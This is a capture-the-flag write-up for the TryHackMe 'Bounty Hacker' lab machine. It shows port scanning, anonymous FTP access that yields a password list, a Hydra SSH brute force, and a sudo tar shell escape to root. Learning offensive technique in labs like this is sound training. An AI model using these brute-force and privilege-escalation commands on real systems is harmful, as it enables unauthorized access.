---
title: "TryHackMe - Bounty Hacker"
categories:
  - TryHackMe
tags:
  - linux
  - writeup
  - tryhackme
  - hacking
---
You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Scanning
Running `rustscan` with `aggressive` mode.
```bash
─$ rustscan -a 10.10.140.128 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.140.128:21
Open 10.10.140.128:22
Open 10.10.140.128:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 06:20 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:20
Completed NSE at 06:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:20
Completed NSE at 06:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:20
Completed NSE at 06:20, 0.00s elapsed
Initiating Ping Scan at 06:20
Scanning 10.10.140.128 [2 ports]
Completed Ping Scan at 06:20, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:20
Completed Parallel DNS resolution of 1 host. at 06:20, 13.02s elapsed
DNS resolution of 1 IPs took 13.02s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 06:20
Scanning 10.10.140.128 [3 ports]
Discovered open port 22/tcp on 10.10.140.128
Discovered open port 21/tcp on 10.10.140.128
Discovered open port 80/tcp on 10.10.140.128
Completed Connect Scan at 06:20, 0.19s elapsed (3 total ports)
Initiating Service scan at 06:20
Scanning 3 services on 10.10.140.128
Completed Service scan at 06:20, 6.45s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.140.128.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:20
NSE: [ftp-bounce 10.10.140.128:21] PORT response: 500 Illegal PORT command.
Completed NSE at 06:20, 5.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:20
Completed NSE at 06:20, 1.34s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:20
Completed NSE at 06:20, 0.00s elapsed
Nmap scan report for 10.10.140.128
Host is up, received syn-ack (0.19s latency).
Scanned at 2021-01-12 06:20:03 EST for 27s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.25.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There is FTP open and we can use anonymous user, SSH, and http.

## Enumeration
I will see the FTP first using `anonymous` user.
```bash
$ ftp 10.10.140.128
Connected to 10.10.140.128.
220 (vsFTPd 3.0.3)
Name (10.10.140.128:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt? 
200 PORT command successful. Consider using PASV.

150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.08 secs (5.1171 kB/s)
mget task.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (64.5347 kB/s)
```
- Task.txt:
    ```
    1.) Protect Vicious.
    2.) Plan for Red Eye pickup on the moon.

    -lin
    ```
- Locks.txt:
    ```
    rEddrAGON
    ReDdr4g0nSynd!cat3
    Dr@gOn$yn9icat3
    R3DDr46ONSYndIC@Te
    ReddRA60N
    R3dDrag0nSynd1c4te
    dRa6oN5YNDiCATE
    ReDDR4g0n5ynDIc4te
    R3Dr4gOn2044
    RedDr4gonSynd1cat3
    R3dDRaG0Nsynd1c@T3
    Synd1c4teDr@g0n
    reddRAg0N
    REddRaG0N5yNdIc47e
    Dra6oN$yndIC@t3
    4L1mi6H71StHeB357
    rEDdragOn$ynd1c473
    DrAgoN5ynD1cATE
    ReDdrag0n$ynd1cate
    Dr@gOn$yND1C4Te
    RedDr@gonSyn9ic47e
    REd$yNdIc47e
    dr@goN5YNd1c@73
    rEDdrAGOnSyNDiCat3
    r3ddr@g0N
    ReDSynd1ca7e
    ```

We got username `lin` and probably list of his / her password. 

## Exploit
Since we got SSH port open before, let's bruteforce it.
```bash
$ hydra -l lin -P ~/locks.txt 10.10.140.128 -t 4 ssh                                                  255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-12 06:34:53
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.140.128:22/
[22][ssh] host: 10.10.140.128   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-12 06:35:04
```
We got the password!

## Escalation
SSH with lin's account.
```bash
$ ssh lin@10.10.140.128  
The authenticity of host '10.10.140.128 (10.10.140.128)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.140.128' (ECDSA) to the list of known hosts.
lin@10.10.140.128's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
```

user.txt
```bash
lin@bountyhacker:~/Desktop$ cat user.txt
THM{REDACTED}
```

Checking sudo priv.
```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

We can run `tar` as root with sudo, let's abuse it!
```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami    
root
```

root.txt:
```bash
# cat /root/root.txt
THM{REDACTED}
```